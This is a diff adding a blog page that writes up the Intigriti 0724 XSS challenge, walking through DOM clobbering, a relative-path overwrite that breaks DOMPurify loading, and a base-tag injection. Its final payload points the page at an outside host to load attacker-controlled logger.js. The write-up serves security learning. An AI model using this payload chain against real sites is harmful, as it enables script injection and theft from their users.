@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html class="" lang="en-us"><head>
+    
+    <meta name="robots" content="noai, noimageai">
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/logo2.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo2.png'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            Intigriti 0724 XSS Challenge  &ndash;
+        
+        Alfin&#39;s Notes
+    </title>
+
+    
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+
+    
+        <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
+    
+    
+    <link type="text/css" rel="stylesheet" href=http://example.org/css/styles.abbd6311bb4b6ca58f8e7398140529245ae0f6428b759fcd830742eee2619eabb900ba9914a9affb82aa9a16a9b9ea727bb315315a976a0db0e7513a5f12c504.css integrity="sha512-q71jEbtLbKWPjnOYFAUpJFrg9kKLdZ/NgwdC7uJhnqu5ALqZFKmv&#43;4Kqmhapuepye7MVMVqXag2w51E6XxLFBA==" />
+<meta name="author" content="Gabriele Musco" />
+
+    
+        <meta name="keywords" content='writeups' />
+    
+    
+        <meta name="description" content="rong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Dom clobbering to clobber isDevelopmet&lt;/li&gt;
+&lt;li&gt;Throwing an error using RPO to prevent Dompurify from loading&lt;/li&gt;
+&lt;li&gt;Using base tag&amp;rsquo;s to import our evil.js&lt;/li&gt;
+&lt;/ul&gt;" />
+    
+
+<meta property="og:site_name"
+    content='Alfin&#39;s Notes' />
+
+    <meta property="og:title" content="Intigriti 0724 XSS Challenge" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Gabriele Musco" />
+    <meta
+        property="article:published_time"
+        content='2024-06-06T21:00:26Z&#43;0530' />
+    
+        
+            <meta property="article:tag" content="writeups" />
+        
+    
+    <meta property="og:url" content="http://example.org/posts/intigriti-0724/" />
+    
+    
+    <meta property="og:image"
+        content="http://example.org/icon512.png" />
+    
+        <meta property="og:description" content="&lt;p&gt;&lt;strong&gt;tl;dr&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Dom clobbering to clobber isDevelopmet&lt;/li&gt;
+&lt;li&gt;Throwing an error using RPO to prevent Dompurify from loading&lt;/li&gt;
+&lt;li&gt;Us" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='example.org'
+/>
+<meta property="twitter:url" content="http://example.org/posts/intigriti-0724/" />
+
+
+    <meta name="twitter:title" content="Intigriti 0724 XSS Challenge" />
+    
+    
+    
+    <meta name="twitter:image"
+        content="http://example.org/icon512.png" />
+    
+        <meta name="twitter:description" content="&lt;p&gt;&lt;strong&gt;tl;dr&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Dom clobbering to clobber isDevelopmet&lt;/li&gt;
+&lt;li&gt;Throwing an error using RPO to prevent Dompurify from loading&lt;/li&gt;
+&lt;li&gt;Us" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo2.png' alt='Logo'/>
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">Alfin&#39;s Notes</a>
+                        
+                    </h1>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts/">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="http://example.org/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags/">Tags</a></li>
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search/?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="/index.xml">
+    
+    
+        &#xf09e;
+    
+    <span>
+        RSS
+    </span>
+</a>
+
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://gitlab.com/gabmus">
+    
+    
+        &#xf296;
+    
+    <span>
+        GitLab
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://gitlab.gnome.org/gabmus">
+    
+    
+        &#xf361;
+    
+    <span>
+        GNOME GitLab
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>Intigriti 0724 XSS Challenge</h1>
+    
+    
+        <p class="date">
+            <span title='Date'>󰃭 </span>
+    2024-06-06
+
+
+        </p>
+    
+    
+    
+    
+    <div><p><strong>tl;dr</strong></p>
+<ul>
+<li>Dom clobbering to clobber isDevelopmet</li>
+<li>Throwing an error using RPO to prevent Dompurify from loading</li>
+<li>Using base tag&rsquo;s to import our evil.js</li>
+</ul>
+<h2 id="-initial-analysis">🔎 Initial analysis</h2>
+<p>We are given a memo sharing application , and its seems like we html injection using the memo parameter. Looking at the client-side code for the application.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">script</span> <span style="color:#50fa7b">integrity</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sha256-C1icWYRx+IVzgDTZEphr2d/cs/v0sM76a7AX4LdalSo=&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;memoForm&#34;</span>).addEventListener(<span style="color:#f1fa8c">&#34;submit&#34;</span>, (event) =&gt; {
+</span></span><span style="display:flex;"><span>        event.preventDefault();
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">const</span> memoContent <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;memoContentInput&#34;</span>).value;
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">window</span>.location.href <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">`</span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">window</span>.location.href.split(<span style="color:#f1fa8c">&#34;?&#34;</span>)[<span style="color:#bd93f9">0</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">?memo=</span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">encodeURIComponent</span>(
+</span></span><span style="display:flex;"><span>          memoContent
+</span></span><span style="display:flex;"><span>        )<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>;
+</span></span><span style="display:flex;"><span>      });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">const</span> urlParams <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> URLSearchParams(<span style="color:#8be9fd;font-style:italic">window</span>.location.search);
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">const</span> sharedMemo <span style="color:#ff79c6">=</span> urlParams.get(<span style="color:#f1fa8c">&#34;memo&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> (sharedMemo) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">const</span> displayElement <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;displayMemo&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//Don&#39;t worry about XSS, the CSP will protect us for now
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        displayElement.innerHTML <span style="color:#ff79c6">=</span> sharedMemo;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (origin <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#34;http://localhost&#34;</span>) isDevelopment <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">true</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (isDevelopment) {
+</span></span><span style="display:flex;"><span>          <span style="color:#6272a4">//Testing XSS sanitization for next release
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>          <span style="color:#ff79c6">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">const</span> sanitizedMemo <span style="color:#ff79c6">=</span> DOMPurify.sanitize(sharedMemo);
+</span></span><span style="display:flex;"><span>            displayElement.innerHTML <span style="color:#ff79c6">=</span> sanitizedMemo;
+</span></span><span style="display:flex;"><span>          } <span style="color:#ff79c6">catch</span> (error) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">const</span> loggerScript <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.createElement(<span style="color:#f1fa8c">&#34;script&#34;</span>);
+</span></span><span style="display:flex;"><span>            loggerScript.src <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;./logger.js&#34;</span>;
+</span></span><span style="display:flex;"><span>            loggerScript.onload <span style="color:#ff79c6">=</span> () =&gt; logError(error);
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">document</span>.head.appendChild(loggerScript);
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#ff79c6">script</span>&gt;
+</span></span></code></pre></div><p>as you can see our input HTML goes into an innerHTML sink in the beginning itself, however there is no easy XSS as there is a CSP.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">default</span><span style="color:#ff79c6">-</span>src <span style="color:#ff79c6">*</span>; script<span style="color:#ff79c6">-</span>src <span style="color:#f1fa8c">&#39;strict-dynamic&#39;</span> <span style="color:#f1fa8c">&#39;sha256-bSjVkAbbcTI28KD1mUfs4dpQxuQ+V4WWUvdQWCI4iXw=&#39;</span> <span style="color:#f1fa8c">&#39;sha256-C1icWYRx+IVzgDTZEphr2d/cs/v0sM76a7AX4LdalSo=&#39;</span>;
+</span></span></code></pre></div><p>The csp doesnt seem too strict , the first thing that i thought of was that default src is * and there is no base uri directive in the csp .</p>
+<p>So we can inject a base tag with our server as the href value which will make all the scripts with relative paths in the page load resources from our server.</p>
+<p>However there is only one script being used in the page which is  dompurify.js and it is being loaded way before our injection happens so we cant make it load from our server using base tags.</p>
+<p>However there is another script (logger.js) that is being loaded dynamically if certain conditions are satisfied. We can control the location from where logger.js is loaded using base tags as it is being loaded after our injection happens .</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (origin <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#34;http://localhost&#34;</span>) isDevelopment <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">true</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (isDevelopment) {
+</span></span><span style="display:flex;"><span>          <span style="color:#6272a4">//Testing XSS sanitization for next release
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>          <span style="color:#ff79c6">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">const</span> sanitizedMemo <span style="color:#ff79c6">=</span> DOMPurify.sanitize(sharedMemo);
+</span></span><span style="display:flex;"><span>            displayElement.innerHTML <span style="color:#ff79c6">=</span> sanitizedMemo;
+</span></span><span style="display:flex;"><span>          } <span style="color:#ff79c6">catch</span> (error) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">const</span> loggerScript <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.createElement(<span style="color:#f1fa8c">&#34;script&#34;</span>);
+</span></span><span style="display:flex;"><span>            loggerScript.src <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;./logger.js&#34;</span>;
+</span></span><span style="display:flex;"><span>            loggerScript.onload <span style="color:#ff79c6">=</span> () =&gt; logError(error);
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">document</span>.head.appendChild(loggerScript);
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>So to make logger.js load from our external server we have somehow reach the catch block. So for that to happen we need isDevelopment to be true, so that we can get inside the if block.</p>
+<p>isDeveloment is only set to true if the origin is localhost.At the first glance it seems impossible to set isDevelopment as true.</p>
+<p>However there are certain stuff you could to with just HTML injection!!</p>
+<h2 id="-attack-plan">🥷 Attack plan</h2>
+<p>So the attack plan is to use DOM clobbering here as we have HTML injection to define the isDevelopment variable. As isDevelopment is a global variable a simple tag with id attribute as isDevelopment will define that variable. Eg</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>a id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;isDevelopment&#34;</span><span style="color:#ff79c6">&gt;</span>,<span style="color:#ff79c6">&lt;</span>div id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;isdevelopment&#34;</span><span style="color:#ff79c6">&gt;</span> etc 
+</span></span></code></pre></div><h2 id="causing-an-error-to-reach-the-catch-block-">Causing an Error to reach the catch block 🌟</h2>
+<p>So now we are inside the if block , and to get to our logger.js script to load we have to get to the catch block . For that we have to cause an error somehow in these lines of code</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">try</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> sanitizedMemo <span style="color:#ff79c6">=</span> DOMPurify.sanitize(sharedMemo);
+</span></span><span style="display:flex;"><span>    displayElement.innerHTML <span style="color:#ff79c6">=</span> sanitizedMemo;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>If you look at the source code closely you can see that Dompurify is being loaded as a relative path. so if we access the page like /index.html/blah dompurify will try to get loaded from /blah .</p>
+<p>So now that we are in the catch block we can use a base tag to load logger.js from our server.</p>
+<h2 id="--final-payloads">🚀  Final Payloads</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">a</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;isDevelopment&#34;</span>&gt;asdf&lt;/<span style="color:#ff79c6">a</span>&gt;&lt;<span style="color:#ff79c6">base</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://alfino.free.beeceptor.com/&#34;</span>&gt;
+</span></span></code></pre></div><p>where we host logger.js at <a href="https://alfino.free.beeceptor.com/logger.js">https://alfino.free.beeceptor.com/logger.js</a></p></div>
+</article>
+
+    <hr />
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                href="/tags/writeups/">#writeups</a>
+        
+    </p>
+
+
+
+    <script
+        defer
+        src="https://example.com/js/commento.js"
+        data-no-fonts="true"
+    ></script>
+    <div id="commento"></div>
+
+
+<script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
+
+<div id="ficurinia-cactus-comments"></div>
+
+<script>
+initComments({
+    node: document.getElementById("ficurinia-cactus-comments"),
+    defaultHomeserverUrl: 'https:\/\/matrix.cactus.chat:8448',
+    serverName: 'cactus.chat',
+    siteName: "example.com",
+    commentSectionId: "9d671d80c8fe68a44481cec6dedd61f0"
+})
+</script>
+
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2025 &copy; Some copyright notice - <a href="https://example.com/license">my license</a>
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+    
+        <script
+            async
+            defer
+            data-domain="example.com"
+            src="https://something.com/..."
+        ></script>
+    
+
+
+    
+        <script
+            async
+            defer
+            data-website-id="example-tracking-code"
+            src="https://something.com/..."
+        ></script>
+    
+
+
+</body>
+</html>
